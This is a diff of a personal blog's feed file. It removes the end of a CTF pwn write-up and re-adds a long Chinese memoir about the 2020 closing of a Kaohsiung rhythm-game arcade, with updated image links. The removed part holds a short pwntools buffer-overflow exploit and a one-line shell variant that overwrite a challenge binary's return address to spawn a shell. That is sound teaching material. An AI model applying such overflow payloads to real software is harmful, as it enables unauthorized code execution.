-<figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address</span></span><br><span class="line"><span class="comment"># 要注意由於32位元是little-endian, 所以要用p32()轉成\xeb\x84\x04\x08的格式</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&#x27;aaaa&#x27;</span> + p32(<span class="number">0x080484eb</span>)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (python -c <span class="string">&quot;print(&#x27;a&#x27;*48 + &#x27;a&#x27;*4 + &#x27;\xeb\x84\x04\x08&#x27;)&quot;</span>; cat) | ./bof</span></span><br></pre></td></tr></table></figure>
-
-
-
-<br>
-Pwn大概就是這麼一回事了~
-寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了(｡･ω･｡)
-
-<p>就醬，希望我還能繼續把題目補完（逃</p>
-]]></content>
-      <categories>
-        <category>Security</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pwn Challenge</tag>
-        <tag>NSYSUISC</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>さようなら、大江戶。</title>
-    <url>/2020/5904ca94bb23/</url>
-    <content><![CDATA[<p><img src="https://photos.smugmug.com/photos/i-BLcP568/1/b2866b7d/L/i-BLcP568-L.jpg?70%25"><br>大江戶要消失了了了嗚嗚不要啦啦啦啦啦，這個陪我度過大學時期無數打ㄐ夜晚的家。<br>消息實在是來得突然，前陣子知道美奇萊大概會撐到年底… 結果大江戶過幾天直接公告週末要撤QwQ<br>不過這也讓很多許久不見的老朋友回來踩最後一次ㄋ ~ 宛如一場小型告別式!!</p>
-<a id="more"></a>
-<br>
-
-<h3 id="一些回憶"><a href="#一些回憶" class="headerlink" title="一些回憶"></a>一些回憶</h3><p><strong>#2016.12.3</strong><br>這天是我初見大江戶的日子，那時剛透過轉學考搬到高雄還不到半年<br>同時也是個maimai剛入坑、太鼓只能勉強摸到鬼9星的<font color=#ff0000>真∙萌新</font><br>在這裡常駐到現在大概也三年半了，雖然和那些五年、十年的資深玩家比起來可能還算小咖<br>但… 我才不管辣 w</p>
-<p>永遠還記得我第一次要踩大江戶找不到入口，從Google Maps看起來明明位置沒錯<br>招牌卻寫著寫著集娃娃，約了網友見面還以為集娃娃=大江戶真ㄉ超糗（幹<br>（Google Maps 麻煩請出來好好解釋一下）<br>題外話、集娃娃根據消息也只會撐到六月底<br>我雖然不常踩，但好歹也是摸過那邊的太鼓、IIDX、ju、還有… 夾娃娃機（？？？）</p>
-<p><img src="https://photos.smugmug.com/photos/i-GHdSQkv/0/3791e2f3/M/i-GHdSQkv-M.jpg?300x"></p>
-<p>剛來到高雄時，只有入坑太鼓的我還規劃要踩遍南部所有的點，現在想想當時的我真的還蠻閒der ㄏㄏ<br>而從上圖可以注意到南部踩點已經來到Part10才輪到大江戶，會這麼晚踩的原因就是交通真ㄉhen不方便= =<br>大學時我住在北高雄楠梓靠近蚵仔寮一帶，熟人都知道我沒房沒車沒朋友(欸不是)，全靠捷運公車雙腳跑天下<br>就連夢時代我都能夠搭捷運轉輕軌一路睡過去，大江戶則是搭完捷運還要走一段路/轉公車<br>因此打ㄐ前期玩太鼓&amp;maimai主要還是常駐最近的新左營Happy100（公車25min），沒事不會想特地跑到大江戶Zzz<br><br><br>在我搬到高雄的這三年來，經歷了尚美保齡球館的太鼓撤機、新堀江集娃娃衰退、新左營Happy100閉店<br>結果下一個撤點居然是大江戶，或許這大概是做夢也想不到的事 ._.</p>
-<p>回想當時還在新左營Happy100成團定居的我，隨著大部分高中團員們畢業北上深耕、以及大江戶的代幣優惠誘惑(?)<br>讓我開始從一週 1 次、到最後每週跑大江戶 2,3 次，其中還不小心拉了友人A入坑讓我換代幣不再邊緣www<br>每次待在大江戶都是3hr起跳，畢竟前面提到的交通不便，也因為友人A這位公車通的規劃，<br>讓我們從楠梓搭公車到大江戶來回轉車要2hr/20摳，窮學生(?)用時間換取金錢…<br>很懷念當時在大江戶每次只要到22:30，就一定要把東西收拾好準備趕末班公車，成了一種日常風景。</p>
-<p>附圖的貼文是某次在新左營準備轉車時拍的新衣服，覺得好看：）<br>看看那個時間就知道我們到家都快跨日了 ㄏㄏ</p>
-<p><img src="https://photos.smugmug.com/photos/i-J4ZsCdM/0/d45d8e04/L/i-J4ZsCdM-L.jpg?300x"></p>
-<p>而在大江戶認識了許多來自不同背景的朋友，但共同點都是喜歡打音Game!!<br>雖然在過程中總是會有人來來去去，但每一次的揪團、每一次的聯機都是那麼地令人開心。</p>
-<p>而我不僅從太鼓轉坑到maimai，在這裡也開始慢慢接觸到不同的機台<br>換個在地人的說法就是… 「逐漸從大江戶外面玩到裡面」XD</p>
-<br>
-
-<p>就在去年、我從某地名大學順利畢業，並且登入西子灣研究所繼續下一個階段。<br>老實說當初推甄時在學校的選擇上，真的有一部分考量是捨不得高雄的朋友們QQ<br>我知道這種攸關未來的決定，這想法有點荒謬… 但就是 &gt;///&lt;</p>
-<p>因此大江戶的消失或許某方面也意味著，明年我能夠不留遺憾地離開高雄吧。<br>（當然前提是我能畢業 = v =）</p>
-<p>同樣是去年的暑假，應該是我跑大江戶最勤奮的時候。<br>一方面是住所搬到西子灣距離近了很多，另一方面也是剛畢業很閒（小聲）<br>平均一週可以跑4, 5天，而且都待整個下午/晚上。<br>另外總算不用坐來回2hr的公車、這距離我能騎單車(單程約30min)，自然就能待到閉店w 爽辣<br>那時也意外入坑IIDX、GITADORA，認識了一些完全不同年齡層的大叔們(笑)</p>
-<p>但隨著開學，實驗室行程逐漸填滿我的行事曆，去大江戶的頻率也少了許多。<br>一旦忙起來一週更是剩下 1 次、甚至…なし<br>雖然偶爾有空還是會努力撥抽時間跑大江戶，但目的就變成打機為主，而非交流。<br>因此偶爾遇到貝貝國的各位邀約打牌我都只能推託，現在想來真的很抱歉QQ</p>
-<p>到後面IIDX隨著打機頻率降低慢慢地淡出、GITADORA靠著桿子的片還算有動力投幣<br>至於maimai在DX大改版後實在很難再回到過去的全盛期，畢竟高雄地區廣設maiDX到處都有點可以踩<br>因此雖然我主修maimai，但也已經不太會特地在大江戶摸：/</p>
-<p><img src="https://photos.smugmug.com/photos/i-jR34htJ/0/ae38aaca/X2/i-jR34htJ-X2.jpg?300x"></p>
-<p>大江戶畫下休止符，給人一種從這裡畢業的感覺。<br>不管是拿了段位成就、認識偶像大佬、揪團吃飯等半天、參加趣味賽互相陷害(?)、廚歌為了繳出漂亮的成績單<br>在明天過後，大家都注定很難聚在一塊了QwQ<br>畢竟高雄市區內很難找到機台種類如此完整的音Game機廳QQ</p>
-<p>先不說早在幾個月前被撤掉的DRS<br>GITADORA、Nostalgia頂多搬到樓上集娃娃撐到六月底，之後都還是會分散在其他地方<br>甚至高雄唯一的DDR會不會就此絕跡 …</p>
-<p><br><br></p>
-<h3 id="回到現在"><a href="#回到現在" class="headerlink" title="回到現在"></a>回到現在</h3><p>大江戶閉店最後三天，剛好我的期中考也告(ㄓㄚˋ)一個段落<br>想當然爾… 我就去爆www</p>
-<p><strong>#2020.4.24(Fri.)</strong></p>
-<p>事情忙完跑了趟大江戶，原以為應該會有很多朋友來消耗代幣，結果意外不多<br>然後外面打牌熟悉的桌椅被收掉了，一時間變得很難找地方發慌QQ<br>有趣的是後面兩天，貝貝國的各位還是拿了張塑膠椅子當桌子打牌…<br>正所謂來大江戶不一定要花錢打機，但打牌是一定要的XDDD</p>
-<p>和幾位朋友寒暄後就開始找DM熱血開敲!!!<br>因為從四月初的連假回高雄就被實驗室的事務沒空出門QQ<br>沒想到等到期中考結束再回到大江戶就已經準備要閉店了 嗚嗚</p>
-<p>趁沒什麼人的這一天拍了幾張照：）</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 100%;"><img src="https://photos.smugmug.com/photos/i-Rmc47ZS/0/fa8a2b1d/X2/i-Rmc47ZS-X2.jpg?400x"></div></div><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-xzGwkZq/0/35ed559c/X2/i-xzGwkZq-X2.jpg?400x"></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-tV6LPBF/0/195cf25f/X2/i-tV6LPBF-X2.jpg?400x"></div></div></div></div>
-
-<br>
-**#2020.4.25(Sat.)**
-
-<p>從粉專先前公告今天午後會開始出清店內海報，可想而知人不會太少。<br>只是時間比我想像中的還要早，還以為至少要到14點才開始XD<br><img src="https://photos.smugmug.com/photos/i-nWjV7q5/0/1e771bc2/X2/i-nWjV7q5-X2.jpg?300x"></p>
-<p>不過我住宿舍本來就不好收這些東西，所以也沒有很難過… 嗎？<br>有想過收來留念，只是收了也不見得會貼，還是給其他有緣人吧。</p>
-<p>這天真的超～級～多～人～  無疑大江戶是最熱鬧的時刻。<br>撤點消息吸引了很多許久不見老朋友回來踩點探最後一眼，也認識了一些沒講過話但早已習慣對方存在的新朋友。<br>大家互相寒暄的場面真的很像一場小型告別式… 噢不是很像、是真的qq<br>現場人多到我原本想替朋友花代幣還找不到空機台可以摸XDDDD</p>
-<p>除了海報之外，櫃檯出清了不少東西老玩具(?) 想必大家都滿載而歸吧<br>對我來說不只是那些周邊，留在這裡的回憶才是最無價der（官腔模式）</p>
-<p>↓↓↓ 從大江戶粉專抓下來的大合照 偉哉FB專業壓畫質 ↓↓↓<br><img src="https://photos.smugmug.com/photos/i-3Jp8RJw/0/cd4db09c/L/i-3Jp8RJw-L.jpg"></p>
-<br>
-**#2020.4.26(Sun)**
-
-<p>大江戶營業最後一天。<br>雖然昨日老板娘送出了不少周邊，但還是有留一些…卡片？總之就是繼續出清周邊XD<br>不過這天我下午依舊窩在實驗室，同時也花了點時間開始寫這篇心得文~</p>
-<p>晚上和貝貝國的各位找到了附近一間牛排店踩雷，結果意外地很好ㄘ，而且免費加麵、免費濃湯、好ㄏ的奶茶！<br>可是大江戶消失應該也不太會路過這裡了 嗚嗚桑心<br><img src="https://photos.smugmug.com/photos/i-zSMTQZC/0/9e9b1b2c/X2/i-zSMTQZC-X2.jpg?400x"></p>
-<p>這一天雖然人也不少，但就沒有昨天那麼熱鬧（也有可能是下午人爆多我不知道w）<br>感覺就和平常一樣，打打牌、敲敲DM、還有… 被抓去摸IIDX !!<br>嗯對w 突然被小洁揪了兩道，雖然手感還沒抓到，但感覺一直敲GTDR的準度有出來了www<br>而且在閉店的最後一道，我不怕死地摸了段位，驚險過初段了 \ 撒花 /<br>還記得去年入坑26代IIDX在集娃娃才第二首就炸惹，這次撐到第四首壓12%血好斗好抖((((<br>聽說初段才是這遊戲的開始… 那我算是及格了吧:3</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-DBsrh3t/0/6c2d7f92/X2/i-DBsrh3t-X2.jpg?400x"></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-bSGLtk4/0/694ff899/X2/i-bSGLtk4-X2.jpg?400x"></div></div></div></div>
-
-<br>
-**#2020.4.27(Mon.) midnight**
-閉店過了十分鐘還是很多人w 大家都捨不得離開，到處找大江戶角落合照。
-同時老闆娘又...又把周邊拿出來送了，看起來東西真的很多www
-有一張大家伸手搶maimai側錄板的照片，爛手機沒存到QQQ
-反正現場就跟競標戰場一樣，只是東西都是免費der
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-gLkdwRx/1/80c701ba/X2/i-gLkdwRx-X2.jpg?400x"></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-z3ZwjQJ/0/45dea4bf/X2/i-z3ZwjQJ-X2.jpg?400x"></div></div></div></div>
-吃完宵夜約2:30再度回到大江戶，燈已經暗了、人也都離開了。
-我雖然沒有經歷更早的美嘉時期、但至少見證了大江戶時期的閉幕...
-
-
-<h3 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h3><p>由衷感謝大江戶，把來自不同背景的我們聚集起來<br>讓我苦悶的大學生活不再只有考試讀書，希望幾十年後講出「我曾經待過大江戶哦」<br>還能喚起身邊朋友的共鳴，以及現在的種種回憶：）</p>
-<p>未來大家應該很難再聚在一起，畢竟主修的機台種類不太一樣。<br>即便目前大江戶的機台都會上移到集娃娃，但應該也只能撐到六月底。<br>我會待的點應該就剩下六合湯(maiDX、DRS)，為了摸GTDR或許一個月抽個幾次跑鳳湯ㄅ</p>
-<p>最後就是感謝名單了，其中不乏一些退坑的朋友…</p>
-<p>感謝過去擔任我的ㄙ機們：砲砲、國王、粉大、塗大、偷尼、ㄓㄩ、洋哥、89珍奶、菇菇<br>算起來真的還蠻多人的(笑) 謝謝你們讓我在大江戶還能順利回家&gt;w&lt;</p>
-<p>感謝帶我入坑IIDX的小洁、GITADORA的鳥巢（雖然你帶我打IIDX比較多ㄏ）。<br>感謝GITADORA的情侶黨，姊姊常常教我不同活動的訣竅，雖然最後一次遇到還是不曉得怎麼稱呼XD<br>感謝貝貝國大江戶州的各位住民們，沒想到我也能自稱是開國元老了呢 XDDDD<br>沒有你們，就…就沒人揪我ㄘ宵夜了（咦</p>
-<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-ZS6X7D8/0/456cfa2e/X2/i-ZS6X7D8-X2.jpg"></div><div class="group-picture-column" style="width: 50%;"><img src="https://photos.smugmug.com/photos/i-pMwSf7x/0/570fa55d/X2/i-pMwSf7x-X2.jpg"></div></div></div></div>
-
-<p>希望之後巧遇各位還能夠找我打ㄐ唷&lt;3<br>另外砲砲和菇菇(ㄉ女友?)有發一顆草莓吊飾的信物，有拿到的朋友記得明年這個時候要回來唷(笑)</p>
-<h3 id="後記2"><a href="#後記2" class="headerlink" title="後記2"></a>後記2</h3><p>從主修maimai開始入駐大江戶，到最後是主修GITADORA迎來閉店。<br>四月春假在台北摸過天台的鼓之後，才發現自己習慣了大江戶的鼓，回不去了w<br>目前收到消息會搬上集娃娃，但之後不曉得這組機台最後會何去何從呢 ~</p>
-<p><img src="https://photos.smugmug.com/photos/i-QVLHHVB/1/4bf512e9/X3/i-QVLHHVB-X3.jpg?600x"></p>
-]]></content>
-      <categories>
-        <category>休閒娛樂</category>
-      </categories>
-      <tags>
-        <tag>音Game</tag>
-      </tags>
   </entry>
   <entry>
     <title>TJCTF 2020 - Weak Password (Web)</title>
@@ -1480,6 +1401,274 @@ Pwn大概就是這麼一回事了~
         <tag>CTF</tag>
         <tag>TJCTF 2020</tag>
         <tag>Web Challenge</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>さようなら、大江戶。</title>
+    <url>/2020/ff38c4947c14/</url>
+    <content><![CDATA[<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860190/blog-posts/2020-04/26-cover.webp" alt=" "><br>大江戶要消失了了了嗚嗚不要啦啦啦啦啦，這個陪我度過大學時期無數打ㄐ夜晚的家。<br>消息實在是來得突然，前陣子知道美奇萊大概會撐到年底… 結果大江戶過幾天直接公告週末要撤QwQ<br>不過這也讓很多許久不見的老朋友回來踩最後一次ㄋ ~ 宛如一場小型告別式!!</p>
+<a id="more"></a>
+<br>
+
+<h3 id="一些回憶"><a href="#一些回憶" class="headerlink" title="一些回憶"></a>一些回憶</h3><p><strong>#2016.12.3</strong><br>這天是我初見大江戶的日子，那時剛透過轉學考搬到高雄還不到半年<br>同時也是個maimai剛入坑、太鼓只能勉強摸到鬼9星的<font color=#ff0000>真∙萌新</font><br>在這裡常駐到現在大概也三年半了，雖然和那些五年、十年的資深玩家比起來可能還算小咖<br>但… 我才不管辣 w</p>
+<p>永遠還記得我第一次要踩大江戶找不到入口，從Google Maps看起來明明位置沒錯<br>招牌卻寫著寫著集娃娃，約了網友見面還以為集娃娃=大江戶真ㄉ超糗（幹<br>（Google Maps 麻煩請出來好好解釋一下）<br>題外話、集娃娃根據消息也只會撐到六月底<br>我雖然不常踩，但好歹也是摸過那邊的太鼓、IIDX、ju、還有… 夾娃娃機（？？？）</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_400/v1619860181/blog-posts/2020-04/26-post1.webp" alt=" "></p>
+<p>剛來到高雄時，只有入坑太鼓的我還規劃要踩遍南部所有的點，現在想想當時的我真的還蠻閒der ㄏㄏ<br>而從上圖可以注意到南部踩點已經來到Part10才輪到大江戶，會這麼晚踩的原因就是交通真ㄉhen不方便= =<br>大學時我住在北高雄楠梓靠近蚵仔寮一帶，熟人都知道我沒房沒車沒朋友(欸不是)，全靠捷運公車雙腳跑天下<br>就連夢時代我都能夠搭捷運轉輕軌一路睡過去，大江戶則是搭完捷運還要走一段路/轉公車<br>因此打ㄐ前期玩太鼓&amp;maimai主要還是常駐最近的新左營Happy100（公車25min），沒事不會想特地跑到大江戶Zzz<br><br><br>在我搬到高雄的這三年來，經歷了尚美保齡球館的太鼓撤機、新堀江集娃娃衰退、新左營Happy100閉店<br>結果下一個撤點居然是大江戶，或許這大概是做夢也想不到的事 ._.</p>
+<p>回想當時還在新左營Happy100成團定居的我，隨著大部分高中團員們畢業北上深耕、以及大江戶的代幣優惠誘惑(?)<br>讓我開始從一週 1 次、到最後每週跑大江戶 2,3 次，其中還不小心拉了友人A入坑讓我換代幣不再邊緣www<br>每次待在大江戶都是3hr起跳，畢竟前面提到的交通不便，也因為友人A這位公車通的規劃，<br>讓我們從楠梓搭公車到大江戶來回轉車要2hr/20摳，窮學生(?)用時間換取金錢…<br>很懷念當時在大江戶每次只要到22:30，就一定要把東西收拾好準備趕末班公車，成了一種日常風景。</p>
+<p>附圖的貼文是某次回家路上在新左營準備轉車時拍的新衣服，覺得好看：）<br>看看那個時間就知道我們到家都快跨日了 ㄏㄏ</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_400/v1619860182/blog-posts/2020-04/26-post2.webp" alt=" "></p>
+<p>而在大江戶認識了許多來自不同背景的朋友，但共同點都是喜歡打音Game!!<br>雖然在過程中總是會有人來來去去，但每一次的揪團、每一次的聯機都是那麼地令人開心。</p>
+<p>而我不僅從太鼓轉坑到maimai，在這裡也開始慢慢接觸到不同的機台<br>換個在地人的說法就是… 「逐漸從大江戶外面玩到裡面」XD</p>
+<br>
+
+<p>就在去年、我從某地名大學順利畢業，並且登入西子灣研究所繼續下一個階段。<br>老實說當初推甄時在學校的選擇上，真的有一部分考量是捨不得高雄的朋友們QQ<br>我知道這種攸關未來的決定，這想法有點荒謬… 但就是 &gt;///&lt;</p>
+<p>因此大江戶的消失或許某方面也意味著，明年我能夠不留遺憾地離開高雄吧。<br>（當然前提是我能畢業 = v =）</p>
+<p>同樣是去年的暑假，應該是我跑大江戶最勤奮的時候。<br>一方面是住所搬到西子灣距離近了很多，另一方面也是剛畢業很閒（小聲）<br>平均一週可以跑4, 5天，而且都待整個下午/晚上。<br>另外總算不用坐來回2hr的公車、這距離我能騎單車(單程約30min)，自然就能待到閉店w 爽辣<br>那時也意外入坑IIDX、GITADORA，認識了一些完全不同年齡層的大叔們（笑）</p>
+<p>但隨著開學，實驗室行程逐漸填滿我的行事曆，去大江戶的頻率也少了許多。<br>一旦忙起來一週更是剩下 1 次、甚至…なし<br>雖然偶爾有空還是會努力撥抽時間跑大江戶，但目的就變成打機為主，而非交流。<br>因此偶爾遇到貝貝國的各位邀約打牌我都只能推託，現在想來真的很抱歉QQ</p>
+<p>到後面IIDX隨著打機頻率降低慢慢地淡出、GITADORA靠著<a href="https://www.youtube.com/c/drumsticktw/">桿子</a>的片還算有動力投幣<br>至於maimai在DX大改版後實在很難再回到過去的全盛期，畢竟高雄地區廣設maiDX到處都有點可以踩<br>因此雖然我主修maimai，但也已經不太會特地在大江戶摸：/</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_250/v1619860194/blog-posts/2020-04/26-kanban.webp" alt=" "></p>
+<p>大江戶畫下休止符，給人一種從這裡畢業的感覺。<br>不管是拿了段位成就、認識偶像大佬、揪團吃飯等半天、參加趣味賽互相陷害(?)、廚歌為了繳出漂亮的成績單<br>在明天過後，大家都注定很難聚在一塊了QwQ<br>畢竟高雄市區內很難找到機台種類如此完整的音Game機廳QQ</p>
+<p>先不說早在幾個月前被撤掉的DRS<br>GITADORA、Nostalgia頂多搬到樓上集娃娃撐到六月底，之後都還是會分散在其他地方<br>甚至高雄唯一的DDR會不會就此絕跡 …</p>
+<p><br><br></p>
+<h3 id="回到現在"><a href="#回到現在" class="headerlink" title="回到現在"></a>回到現在</h3><p>大江戶閉店最後三天，剛好我的期中考也告(ㄓㄚˋ)一個段落<br>想當然爾… 我就去爆www</p>
+<p><strong>#2020.4.24(Fri.)</strong></p>
+<p>事情忙完跑了趟大江戶，原以為應該會有很多朋友來消耗代幣，結果意外不多<br>然後外面打牌熟悉的桌椅被收掉了，一時間變得很難找地方發慌QQ<br>有趣的是後面兩天，貝貝國的各位還是拿了張塑膠椅子當桌子打牌…<br>正所謂來大江戶不一定要花錢打機，但打牌是一定要的XDDD</p>
+<p>和幾位朋友寒暄後就開始找DM熱血開敲!!!<br>因為從四月初的連假回高雄就被實驗室的事務沒空出門QQ<br>沒想到等到期中考結束再回到大江戶就已經準備要閉店了 嗚嗚</p>
+<p>趁沒什麼人的這一天拍了幾張照：）</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860187/blog-posts/2020-04/26-view1.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860185/blog-posts/2020-04/26-view2.webp" alt=" "></div></div><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860194/blog-posts/2020-04/26-view3.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619861589/blog-posts/2020-04/26-view4.webp" alt=" "></div></div></div></div>
+
+<br>
+
+<p><strong>#2020.4.25(Sat.)</strong><br>從粉專先前公告今天午後會開始出清店內海報，可想而知人不會太少。<br>只是時間比我想像中的還要早，還以為至少要到14點才開始XD<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_400/v1619860183/blog-posts/2020-04/26-post3.webp" alt=" "></p>
+<p>不過我住宿舍本來就不好收這些東西，所以也沒有很難過… 嗎？<br>有想過收來留念，只是收了也不見得會貼，還是給其他有緣人吧。</p>
+<p>這天真的超～級～多～人～  無疑大江戶是最熱鬧的時刻。<br>撤點消息吸引了很多許久不見老朋友回來踩點探最後一眼，也認識了一些沒講過話但早已習慣對方存在的新朋友。<br>大家互相寒暄的場面真的很像一場小型告別式… 噢不是很像、是真的qq<br>現場人多到我原本想替朋友花代幣還找不到空機台可以摸XDDDD</p>
+<p>除了海報之外，櫃檯出清了不少東西老玩具(?) 想必大家都滿載而歸吧<br>對我來說不只是那些周邊，留在這裡的回憶才是最無價der（官腔模式）</p>
+<p>↓↓↓ 從大江戶粉專抓下來的大合照 偉哉FB專業壓畫質 ↓↓↓<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860183/blog-posts/2020-04/26-post4.webp" alt=" "></p>
+<br>
+
+<p><strong>#2020.4.26(Sun)</strong><br>大江戶營業最後一天。<br>雖然昨日老板娘送出了不少周邊，但還是有留一些…卡片？總之就是繼續出清周邊XD<br>不過這天我下午依舊窩在實驗室，同時也花了點時間開始寫這篇心得文~</p>
+<p>晚上和貝貝國的各位找到了附近一間牛排店踩雷，結果意外地很好ㄘ，而且免費加麵、免費濃湯、好ㄏ的奶茶！<br>可是大江戶消失應該也不太會路過這裡了 嗚嗚桑心<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860202/blog-posts/2020-04/26-dinner.webp" alt=" "></p>
+<p>這一天雖然人也不少，但就沒有昨天那麼熱鬧（也有可能是下午人爆多我不知道w）<br>感覺就和平常一樣，打打牌、敲敲DM、還有… 被抓去摸IIDX !!<br>嗯對w 突然被小洁揪了兩道，雖然手感還沒抓到，但感覺一直敲GTDR的準度有出來了www<br>而且在閉店的最後一道，我不怕死地摸了段位，驚險過初段了 \ 撒花 /<br>還記得去年入坑26代IIDX在集娃娃才第二首就炸惹，這次撐到第四首壓12%血好斗好抖((((<br>聽說初段才是這遊戲的開始… 那我算是及格了吧:3</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860207/blog-posts/2020-04/26-iidx1.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860206/blog-posts/2020-04/26-iidx2.webp" alt=" "></div></div></div></div>
+
+<br>
+
+<p><strong>#2020.4.27(Mon.) Midnight</strong><br>閉店過了十分鐘還是很多人w 大家都捨不得離開，到處找大江戶角落合照。<br>同時老闆娘又…又把周邊拿出來送了，看起來東西真的很多www<br>有一張大家伸手搶maimai側錄板的照片，爛手機沒存到QQQ<br>反正現場就跟競標戰場一樣，只是東西都是免費der</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860204/blog-posts/2020-04/26-view5.webp" alt=" "></p>
+<p>吃完宵夜約2:30再度回到大江戶，燈已經暗了、人也都離開了。<br>我雖然沒有經歷更早的美嘉時期、但至少見證了大江戶時期的閉幕…</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860193/blog-posts/2020-04/26-view6.webp" alt=" "></p>
+<h3 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h3><p>由衷感謝大江戶，把來自不同背景的我們聚集起來<br>讓我苦悶的大學生活不再只有考試讀書，希望幾十年後講出「我曾經待過大江戶哦」<br>還能喚起身邊朋友的共鳴，以及現在的種種回憶：）</p>
+<p>未來大家應該很難再聚在一起，畢竟主修的機台種類不太一樣。<br>即便目前大江戶的機台都會上移到集娃娃，但應該也只能撐到六月底。<br>我會待的點應該就剩下六合湯(maiDX、DRS)，為了摸GTDR或許一個月抽個幾次跑鳳湯ㄅ</p>
+<p>最後就是感謝名單了，其中不乏一些退坑的朋友…</p>
+<p>感謝過去擔任我的ㄙ機們：砲砲、國王、粉大、塗大、偷尼、ㄓㄩ、洋哥、89珍奶、菇菇<br>算起來真的還蠻多人的(笑) 謝謝你們讓我在大江戶還能順利回家&gt;w&lt;</p>
+<p>感謝帶我入坑IIDX的小洁、GITADORA的鳥巢（雖然你帶我打IIDX比較多ㄏ）。<br>感謝GITADORA的情侶黨，姊姊常常教我不同活動的訣竅，雖然最後一次遇到還是不曉得怎麼稱呼XD<br>感謝貝貝國大江戶州的各位住民們，沒想到我也能自稱是開國元老了呢 XDDDD<br>沒有你們，就…就沒人揪我ㄘ宵夜了（咦</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860184/blog-posts/2020-04/26-photo1.webp" alt=" "></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860182/blog-posts/2020-04/26-photo2.webp" alt=" "></div></div></div></div>
+
+<p>希望之後巧遇各位還能夠找我打ㄐ唷&lt;3<br>另外砲砲和菇菇(ㄉ女友?)有發一顆草莓吊飾的信物，有拿到的朋友記得明年這個時候要回來唷（笑）</p>
+<h3 id="後記2"><a href="#後記2" class="headerlink" title="後記2"></a>後記2</h3><p>從主修maimai開始入駐大江戶，到最後是主修GITADORA迎來閉店。<br>四月春假在台北摸過天台的鼓之後，才發現自己習慣了大江戶的鼓，回不去了w<br>目前收到消息會搬上集娃娃，但之後不曉得這組機台最後會何去何從呢 ~</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1619860197/blog-posts/2020-04/26-view7.webp" alt=" "></p>
+]]></content>
+      <categories>
+        <category>休閒娛樂</category>
+      </categories>
+      <tags>
+        <tag>音Game</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Summer Conf. に行きましょう！ PART 1</title>
+    <url>/2020/389e2f1fea7e/</url>
+    <content><![CDATA[<blockquote>
+<p>TODO</p>
+</blockquote>
+<p>AIS3 2020 &amp; COSCUP 2020</p>
+<a id="more"></a>
+
